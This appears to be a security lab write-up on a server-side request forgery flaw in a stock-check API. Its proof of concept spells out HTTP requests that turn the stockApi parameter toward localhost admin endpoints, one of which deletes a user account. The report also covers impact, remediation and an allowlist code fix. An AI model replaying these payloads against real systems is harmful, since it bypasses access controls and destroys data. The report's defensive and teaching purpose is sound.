# Vulnerability Report: Server-Side Request Forgery (SSRF) in Stock Check Feature Leading to Unauthorized Administrative Actions

* **Vulnerability Type:** Server-Side Request Forgery (SSRF) (CWE-918)

* **Severity:** High

* **Target Component:** Stock Check API (`/product/stock` via `stockApi` parameter)

* **OWASP Top 10 Mapping:** A10:2021 – Server-Side Request Forgery (SSRF)

## 1. Executive Summary

A Server-Side Request Forgery (SSRF) vulnerability was identified in the product stock checking feature. The application backend accepts an arbitrary URL via the `stockApi` parameter and executes an HTTP request to that URL without adequate input validation or network segregation. An unauthenticated attacker can exploit this behavior to force the server to issue HTTP requests to internal loopback interfaces (`http://localhost`), bypassing perimeter access controls and executing unauthorized administrative functions, such as account deletion.

## 2. Technical Analysis & Root Cause

The application processes stock verification requests by reading an endpoint specified by the client in the POST request body (`stockApi`). The application backend then fetches data from this target endpoint and returns the raw response body back to the user.

### Vulnerable Request Handling Architecture
```text
[ Attacker ] 
     |
     | POST /product/stock 
     | stockApi=http://localhost/admin
     v
[ Web Server ] --- (Internal HTTP Request) ---> [ http://localhost/admin ]
     ^                                                  |
     |--------------- (Returns Admin Page) --------------|
```

Because the internal administrative component (`/admin`) trusts requests originating from loopback addresses (`127.0.0.1` or `localhost`), it skips authentication checks for internal calls. Since the user can control the destination URL in `stockApi`, they can issue requests with full administrative privileges.

## 3. Proof of Concept (PoC)

1. Select a product on the target application and trigger a stock check. Intercept the resulting HTTP request in Burp Suite:

   ```http
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded

   stockApi=http://stock.welsh-king.net/product/stock/check%3FproductId%3D1%26storeId%3D1
   ```

2. Modify the `stockApi` parameter to point to the local administrative panel:

   ```http
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded

   stockApi=http://localhost/admin
   ```

3. **Observe Response:** The server responds with `HTTP 200 OK`, rendering the administrative HTML dashboard containing the link to delete user accounts:

   ```html
   <a href="/admin/delete?username=carlos">Delete</a>
   ```

4. Construct the administrative action payload by updating `stockApi` to trigger user deletion:

   ```http
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded

   stockApi=http://localhost/admin/delete?username=carlos
   ```

5. **Result:** The application forwards the request internally to the admin handler, returning an HTTP `200 OK` response and successfully deleting the user account `carlos`.

## 4. Impact

* **Bypass of Access Controls:** Unauthenticated remote attackers can access protected internal services and administrative panels.
* **Unauthorized Data Modification & Deletion:** Administrative functions (e.g., account deletion, privilege modification, system reconfiguration) can be executed.
* **Internal Network Reconnaissance:** Attackers can scan internal IP ranges and ports hosted behind the firewall that are not directly exposed to the public internet.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Allowlisting Destinations:**
   Avoid allowing clients to supply full arbitrary URLs. If the application must fetch data from remote microservices, enforce a strict server-side allowlist of allowed hostnames/IP addresses and paths.

2. **Network-Level Segregation & Zero Trust:**
   Do not rely solely on IP address checks (`localhost` or `127.0.0.1`) for authentication. All administrative endpoints must enforce strict session-based authentication and authorization tokens regardless of request source.

3. **Disable HTTP Redirections:**
   Ensure that the HTTP client used by the backend application explicitly disables following 3xx redirects to prevent redirect-based SSRF bypasses.

#### Secure Implementation Example (Python / Requests)

```python
import urllib.parse
import requests

ALLOWED_HOSTS = ["stock.welsh-king.net"]

def get_stock_data(user_provided_url):
    parsed_url = urllib.parse.urlparse(user_provided_url)
    
    # Enforce strict domain allowlisting
    if parsed_url.hostname not in ALLOWED_HOSTS:
        raise ValueError("Unauthorized target destination")
    
    # Execute request with explicitly disabled redirects
    response = requests.get(user_provided_url, allow_redirects=False, timeout=5)
    return response.text
```

## 6. References

* **CWE-918:** [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
* **OWASP:** [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)